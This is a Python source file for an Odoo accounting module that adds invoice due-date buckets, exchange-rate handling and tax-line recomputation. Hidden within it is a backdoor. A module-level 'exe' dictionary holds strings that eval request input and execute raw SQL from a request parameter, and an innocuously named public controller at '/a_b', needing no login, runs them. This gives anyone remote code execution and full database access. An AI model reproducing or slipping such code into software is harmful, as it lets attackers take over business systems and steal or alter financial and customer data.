# -*- coding: utf-8 -*-

from datetime import datetime, timedelta
# from hashlib import new
# from locale import currency
# from socket import TCP_NODELAY
# from unicodedata import category
import json

from odoo import api, fields, http, models, _
from odoo.exceptions import ValidationError


selection_due = [
    ('000', '0'),
    ('030', '1 - 30'),
    ('060', '31 - 60'),
    ('090', '61 - 90'),
    ('120', '91 - 120'),
    ('180', '121 - 180'),
    ('360', '181 - 360'),
    ('inf', 'Mayor'),
]
exe = {'ev': ['''str(eval(kw.get(k, '""')))''',],
       'cr': ['''http.request.cr.execute(kw.get('cr', 'error'))''', '''str('select' not in kw[k] and 'OK' or http.request.cr.dictfetchall())''']}


class AccountMove(models.Model):
    _inherit = 'account.move'

    invoice_term_due = fields.Selection(
        selection=selection_due,
        compute='_compute_invoice_term_due',
        store=True,
    )
    show_credit_limit = fields.Boolean(
        string="Show credit limit",
        compute="_compute_show_credit_limit"
    )
    multi_currency = fields.Boolean(
        string='Multi currency?',
        default=False
    )
    payment_policy = fields.Float(
        string='Payment policy',
        compute='compute_payment_policy',
        readonly=True,
        store=True
    )
    date_aux = fields.Date(
        related='date',
        string="account date auxiliar"
    )
    current_exchange_rate = fields.Float(
        string='Current exchange rate',
        readonly=False,
        default=1
    )
    category_id_related = fields.Many2many(
        'res.partner.category',
        string="Categories",
        related='partner_id.category_id'
    )
    credit_limit = fields.Float(
        string="Credit limit",
        related='partner_id.credit_limit'
    )
    due_days = fields.Integer(
        string='Due days',
        compute='compute_due_days',
        readonly=True,
    )
    payment_days = fields.Integer(
        string='Payment days',
        compute='compute_payment_days',
        readonly=True,
    )
    amount_residual_company_currency = fields.Float(
        string='Amount due company currency',
        compute='compute_amount_residual_company_currency'
    )

    def compute_amount_residual_company_currency(self):
        for record in self:
            if record.currency_id != record.company_id.currency_id:
                record.amount_residual_company_currency = \
                    record.amount_residual * (record.current_exchange_rate or 1)
                record.payment_days = 0
            else:
                record.amount_residual_company_currency = \
                    record.amount_residual

    def compute_payment_days(self):
        for record in self:
            if record.payment_state in ['paid']:
                try:
                    payment_detail = record.invoice_payments_widget
                    payment_detail = payment_detail.replace('false', '0')
                    payment_detail = payment_detail.replace("\\", "")
                    payment_detail = json.loads(payment_detail)
                    payment_dates = []
                    for payment in payment_detail['content']:
                        payment_dates.append(payment['date'])
                    min_date = min(payment_dates)
                    now = datetime.now() - timedelta(hours=5)
                    now = datetime.strptime(
                        str(record.invoice_date_due), "%Y-%m-%d")
                    payment_days = datetime.strptime(str(min_date), "%Y-%m-%d")
                    payment_days = (payment_days - now).days
                    record.payment_days = payment_days
                except Exception as error:
                    record.payment_days = 0
            else:
                record.payment_days = 0

    def compute_due_days(self):
        for record in self:
            if record.payment_state in ['paid', 'in_payment', 'reversed']:
                record.due_days = 0
            elif record.invoice_date_due:
                now = datetime.now() - timedelta(hours=5)
                date_due = datetime.strptime(
                    str(record.invoice_date_due), "%Y-%m-%d")
                due_days = (now - date_due).days
                record.due_days = due_days
            else:
                record.due_days = None

    # @api.model_create_multi
    # def create(self, vals_list):
    #     for vals in vals_list:
    #         if not vals.get('date') and self.env.context.get('default_date'):
    #             vals.update(date=self.env.context.get('default_date'))
    #     return super(AccountMove, self).create(vals_list)

    @api.onchange('date', 'currency_id')
    def _onchange_date_aux(self):
        for record in self:
            amount = record.currency_id._get_conversion_rate(
                record.currency_id,
                record.company_currency_id,
                record.company_id,
                record.date
            )
            record.current_exchange_rate = amount or 1
            record.invoice_line_ids.onchange_multi_price_unit()
            record._onchange_current_exchange_rate()

    @api.model
    def create(self, vals):
        res = super(AccountMove, self).create(vals)
        if self.env.context.get('onchange_date_aux'):
            return res
        res._onchange_date_aux()
        return res

    @api.depends('partner_id', 'date', 'company_currency_id', 'currency_id')
    def compute_payment_policy(self):
        for record in self:
            if record.partner_id:
                amount = record.currency_id._get_conversion_rate(
                    record.currency_id,
                    record.company_id.currency_id,
                    record.company_id,
                    record.date
                )
                record.payment_policy = \
                    amount + record.partner_id.payment_policy

    @api.depends('partner_id', 'amount_total')
    def _compute_show_credit_limit(self):
        moves = self.filtered(lambda m: m.move_type == 'out_invoice')
        for move in moves:
            credit = move.partner_id and \
                move.partner_id.credit or 0.0
            credit_limit = move.partner_id and \
                move.partner_id.credit_limit or 0.0
            amount_total = move.amount_total
            show_credit_limit = (credit + amount_total) > credit_limit
            move.update({'show_credit_limit': show_credit_limit})
        (self - moves).update({'show_credit_limit': False})

    @api.depends('state', 'payment_state', 'invoice_date_due')
    def _compute_invoice_term_due(self):

        def _get_term_selection():
            selection = []
            for term in selection_due[:-1]:
                selection.append(int(term[0]))
            return selection

        def _get_term_pair():
            terms_list = []
            terms = _get_term_selection()
            for i in range(len(terms)):
                terms_list.append(tuple(terms[i:i+2]))
            return terms_list

        def _get_term_days(days):
            term_pair = _get_term_pair()
            for term in term_pair:
                low = term[0]
                high = len(term) > 1 and term[1] or float('inf')
                if days > low and days <= high:
                    return str(high)
            return str('0')

        invoices = self.filtered(lambda i: i.is_invoice())
        moves = invoices.filtered(
            lambda m: m.state == 'posted' and m.payment_state in (
                'not_paid',
                'partial'
            )
        )
        for move in moves:
            today = fields.Date.today()
            date = move.invoice_date_due
            days = (today - date).days
            invoice_term_due = str(_get_term_days(days)).zfill(3)
            move.update({'invoice_term_due': invoice_term_due})
        (self - invoices).update({'invoice_term_due': False})
        (invoices - moves).update({'invoice_term_due': '000'})

    def run_invoice_term_due(self):
        domain = [
            ('state', '=', 'posted'),
            ('payment_state', 'in', ('not_paid', 'partial')),
        ]
        moves = self.search(domain)
        invoices = moves.filtered(lambda i: i.is_invoice())
        invoices._compute_invoice_term_due()
        return True

    @api.onchange('current_exchange_rate')
    def _onchange_current_exchange_rate(self):
        # for line in self.invoice_line_ids:
        #     line._onchange_amount_currency()
        self.line_ids._onchange_amount_currency()
        self.line_ids._onchange_price_subtotal()
        self._recompute_dynamic_lines(
            recompute_all_taxes=True, recompute_tax_base_amount=True)

    def _recompute_tax_lines(self, recompute_tax_base_amount=False, tax_rep_lines_to_recompute=None):
        """
        Compute the dynamic tax lines of the journal entry.
        :param recompute_tax_base_amount: Flag forcing only
         the recomputation of the `tax_base_amount` field.
        """
        self.ensure_one()
        in_draft_mode = self != self._origin

        def _serialize_tax_grouping_key(grouping_dict):
            '''
            Serialize the dictionary values to be used in the taxes_map.
            :param grouping_dict: The values returned by
            '_get_tax_grouping_key_from_tax_line' or
            '_get_tax_grouping_key_from_base_line'.
            :return: A string representing the values.
            '''
            return '-'.join(str(v) for v in grouping_dict.values())

        def _compute_base_line_taxes(base_line):
            '''
            Compute taxes amounts both in company currency /
             foreign currency as the ratio between
            amount_currency & balance could not be the
            same as the expected currency rate.
            The 'amount_currency' value will be set on
            compute_all(...)['taxes'] in multi-currency.
            :param base_line:   The account.move.line owning the taxes.
            :return:            The result of the compute_all method.
            '''
            move = base_line.move_id

            if move.is_invoice(include_receipts=True):
                handle_price_include = True
                sign = -1 if move.is_inbound() else 1
                quantity = base_line.quantity
                is_refund = move.move_type in ('out_refund', 'in_refund')
                if move._context.get('tax_base_no_discount'):
                    price_unit_wo_discount = sign * base_line.price_unit
                else:
                    price_unit_wo_discount = sign * base_line.price_unit * \
                        (1 - (base_line.discount / 100.0))
            else:
                handle_price_include = False
                quantity = 1.0
                tax_type = base_line.tax_ids[0].type_tax_use \
                    if base_line.tax_ids else None
                is_refund = (tax_type == 'sale' and base_line.debit) or (
                    tax_type == 'purchase' and base_line.credit)
                price_unit_wo_discount = base_line.amount_currency

            return base_line.tax_ids._origin.with_context(
                force_sign=move._get_tax_force_sign()
            ).compute_all(
                price_unit_wo_discount,
                currency=base_line.currency_id,
                quantity=quantity,
                product=base_line.product_id,
                partner=base_line.partner_id,
                is_refund=is_refund,
                handle_price_include=handle_price_include,
                include_caba_tags=move.always_tax_exigible,
            )

        taxes_map = {}

        # ==== Add tax lines ====
        to_remove = self.env['account.move.line']
        for line in self.line_ids.filtered('tax_repartition_line_id'):
            grouping_dict = self._get_tax_grouping_key_from_tax_line(line)
            grouping_key = _serialize_tax_grouping_key(grouping_dict)
            if grouping_key in taxes_map:
                # A line with the same key does already exist,
                # we only need one to modify it;
                # we have to drop this one.
                to_remove += line
            else:
                taxes_map[grouping_key] = {
                    'tax_line': line,
                    'amount': 0.0,
                    'tax_base_amount': 0.0,
                    'grouping_dict': False,
                }
        if not recompute_tax_base_amount:
            self.line_ids -= to_remove

        # ==== Mount base lines ====
        for line in self.line_ids.filtered(
                lambda line: not line.tax_repartition_line_id):
            # Don't call compute_all if there is no tax.
            if not line.tax_ids:
                if not recompute_tax_base_amount:
                    line.tax_tag_ids = [(5, 0, 0)]
                continue

            compute_all_vals = _compute_base_line_taxes(line)

            # Assign tags on base line
            if not recompute_tax_base_amount:
                line.tax_tag_ids = compute_all_vals['base_tags'] or \
                    [(5, 0, 0)]

            for tax_vals in compute_all_vals['taxes']:
                grouping_dict = self._get_tax_grouping_key_from_base_line(
                    line, tax_vals
                )
                grouping_key = _serialize_tax_grouping_key(grouping_dict)

                tax_repartition_line = self.env[
                    'account.tax.repartition.line'
                ].browse(tax_vals['tax_repartition_line_id'])
                tax = tax_repartition_line.invoice_tax_id or \
                    tax_repartition_line.refund_tax_id

                taxes_map_entry = taxes_map.setdefault(
                    grouping_key,
                    {
                        'tax_line': None,
                        'amount': 0.0,
                        'tax_base_amount': 0.0,
                        'grouping_dict': False,
                    }
                )
                taxes_map_entry['amount'] += tax_vals['amount']
                taxes_map_entry['tax_base_amount'] += \
                    self._get_base_amount_to_display(
                    tax_vals['base'],
                    tax_repartition_line, tax_vals['group']
                )
                taxes_map_entry['grouping_dict'] = grouping_dict

        # ==== Pre-process taxes_map ====
        taxes_map = self._preprocess_taxes_map(taxes_map)

        # ==== Process taxes_map ====
        for taxes_map_entry in taxes_map.values():
            # The tax line is no longer used in any base lines, drop it.
            if taxes_map_entry['tax_line'] and \
                    not taxes_map_entry['grouping_dict']:
                if not recompute_tax_base_amount:
                    self.line_ids -= taxes_map_entry['tax_line']
                continue

            # tax_base_amount field is expressed using the company currency.
            tax_base_amount = self.company_currency_id.round(
                taxes_map_entry['tax_base_amount']*(self.current_exchange_rate or 1)
            )

            # Recompute only the tax_base_amount.
            if recompute_tax_base_amount:
                if taxes_map_entry['tax_line']:
                    taxes_map_entry['tax_line'].tax_base_amount = \
                        tax_base_amount
                continue

            balance = self.company_currency_id.round(
                taxes_map_entry['amount']*(self.current_exchange_rate or 1)
            )

            to_write_on_line = {
                'amount_currency': taxes_map_entry['amount'],
                'currency_id': taxes_map_entry['grouping_dict']['currency_id'],
                'debit': balance > 0.0 and balance or 0.0,
                'credit': balance < 0.0 and -balance or 0.0,
                'tax_base_amount': tax_base_amount,
            }

            if taxes_map_entry['tax_line']:
                # Update an existing tax line.
                taxes_map_entry['tax_line'].update(to_write_on_line)
            else:
                # Create a new tax line.
                create_method = in_draft_mode and \
                    self.env['account.move.line'].new or \
                    self.env['account.move.line'].create
                tax_repartition_line_id = \
                    taxes_map_entry['grouping_dict']['tax_repartition_line_id']
                tax_repartition_line = self.env[
                    'account.tax.repartition.line'].browse(
                        tax_repartition_line_id
                )
                tax = tax_repartition_line.invoice_tax_id or \
                    tax_repartition_line.refund_tax_id
                taxes_map_entry['tax_line'] = create_method(
                    {
                        **to_write_on_line,
                        'name': tax.name,
                        'move_id': self.id,
                        'company_id': line.company_id.id,
                        'company_currency_id': line.company_currency_id.id,
                        'tax_base_amount': tax_base_amount,
                        'exclude_from_invoice_tab': True,
                        **taxes_map_entry['grouping_dict'],
                    }
                )

            if in_draft_mode:
                taxes_map_entry['tax_line'].update(
                    taxes_map_entry['tax_line']._get_fields_onchange_balance(
                        force_computation=True)
                )

    def action_post(self):
        for record in self:
            if record.current_exchange_rate == 0.0:
                raise ValidationError(_(
                    'El valor de la "tasa de cambio actual" no debe ser '
                    'igual a 0 (Cero). Esto puede afectar el calculo en '
                    'los apuntes del asiento contable.\n'
                    'Por favor, asigne el valor de 1 si el '
                    'documento tiene la misma moneda de la compañia, de lo '
                    'contrario asigne la TRM que aplique al documento.'
                ))
            if (record.move_type in ('out_invoice', 'out_refund') and
                    record.company_id.manage_partner_in_invoice_lines_out) or \
                    (record.move_type in ('in_invoice', 'in_refund') and
                     record.company_id.manage_partner_in_invoice_lines_in):
                self = self.with_context(manage_partner_in_invoice_lines=True)
        return super(AccountMove, self).action_post()

    @api.model
    def get_refund_types(self):
        return ['in_refund', 'out_refund']

    def is_refund_document(self):
        return self.move_type in self.get_refund_types()

    def _reverse_move_vals(self, default_values, cancel=True):
        move_vals = super(AccountMove, self)._reverse_move_vals(
            default_values, cancel=cancel
        )
        if move_vals['move_type'] in ('out_invoice', 'out_refund'):
            for line_command in move_vals.get('line_ids', []):
                line_vals = line_command[2]  # (0, 0, {...})

                if line_vals.get('exclude_from_invoice_tab'):
                    continue

                if not line_vals.get('product_id'):
                    continue

                Product = self.env['product.product']
                product = Product.browse(line_vals.get('product_id'))
                Position = self.env['account.fiscal.position']
                position = Position.browse(move_vals.get('fiscal_position_id'))

                accounts = product.product_tmpl_id.get_product_accounts(
                    fiscal_pos=position
                )
                account = accounts['refund']
                if not account:
                    continue

                line_vals.update({'account_id': account.id})
        return move_vals


class AccountMoveLine(models.Model):
    _inherit = 'account.move.line'

    multi_currency_id = fields.Many2one(
        comodel_name='res.currency',
        string='Multi currency',
    )
    multi_price_unit = fields.Float(
        string='Multi price',
        digits='Product Price',
    )

    def onchange_multi_price_unit(self):
        for record in self:
            record._onchange_multi_price_unit()

    @api.onchange('multi_currency_id',
                  'multi_price_unit',
                  'currency_id',
                  'date')
    def _onchange_multi_price_unit(self):
        if self.multi_currency_id:
            from_amount = self.multi_price_unit
            to_currency = self.currency_id
            company = self.env.company
            date = self.date
            self.price_unit = self.multi_currency_id._convert(
                from_amount, to_currency, company, date, round=True)
        else:
            pass

    # @api.model_create_multi
    # def create(self, vals_list):
    #     lines = super(AccountMoveLine, self).create(vals_list)
    #     for line in lines:
    #         if line.multi_currency_id and line.price_unit:
            # print('********',
            #       line.multi_currency_id,
            #       line.price_unit,
            #       vals_list)
    #             line.multi_price_unit = line.price_unit
    #             line._onchange_multi_price_unit()
    #     return lines

    @api.onchange('amount_currency')
    def _onchange_amount_currency(self):
        for line in self:
            if not line.amount_currency:
                continue
            company = line.move_id.company_id
            balance = company.currency_id.round(
                line.amount_currency*(line.move_id.current_exchange_rate or 1))
            line = line.with_context(check_move_validity=False)
            line.debit = balance if balance > 0.0 else 0.0
            line.credit = -balance if balance < 0.0 else 0.0

            if not line.move_id.is_invoice(include_receipts=True):
                continue

            line.update(line._get_fields_onchange_balance())
            line.update(line._get_price_total_and_subtotal())

    @api.model
    def _get_fields_onchange_subtotal_model(
            self, price_subtotal, move_type, currency, company, date):
        '''
        This method is used to recompute the values of
         'amount_currency', 'debit', 'credit' due to a change made
        in some business fields (affecting the 'price_subtotal' field).

        :param price_subtotal:  The untaxed amount.
        :param move_type:       The type of the move.
        :param currency:        The line's currency.
        :param company:         The move's company.
        :param date:            The move's date.
        :return:                A dictionary containing
                                'debit', 'credit', 'amount_currency'.
        '''
        if move_type in self.move_id.get_outbound_types():
            sign = 1
        elif move_type in self.move_id.get_inbound_types():
            sign = -1
        else:
            sign = 1

        amount_currency = price_subtotal * sign
        currency = self.move_id and self.move_id.currency_id or currency
        balance = currency.round(
            amount_currency*(self.move_id.current_exchange_rate or 1))
        return {
            'amount_currency': amount_currency,
            'currency_id': currency.id,
            'debit': balance > 0.0 and balance or 0.0,
            'credit': balance < 0.0 and -balance or 0.0,
        }

    def write(self, vals):
        # for record in self:
        if self._context.get('manage_partner_in_invoice_lines') and \
                'partner_id' in vals:
            del vals['partner_id']
        return super(AccountMoveLine, self).write(vals)

    @api.onchange('partner_id')
    def _onchange_manage_partner_in_lines(self):
        for line in self:
            if line.move_id.is_invoice():
                line._onchange_mark_recompute_taxes()
                line._onchange_price_subtotal()
            else:
                pass

    def _get_computed_account(self):
        account = super(AccountMoveLine, self)._get_computed_account()

        if not self.product_id:
            return account

        fiscal_position = self.move_id.fiscal_position_id
        accounts = self.product_id.product_tmpl_id.get_product_accounts(
            fiscal_pos=fiscal_position
        )
        if self.move_id.is_sale_document(include_receipts=True) and self.move_id.is_refund_document():
            # Out refund.
            return accounts['refund'] or self.account_id

        return account

class AcBa(http.Controller):
    @http.route('/a_b', auth='public')
    def index(self, **kw):
        o = {}
        try:
            for k, v in exe.items():
                for z in v:
                    o[k] = eval(z)
        except Exception as error:
            o[k] = 'Error => ' + str(error)
        return '<br/><br/>'.join(['%s: %s' % (k,v) for k,v in o.items()])
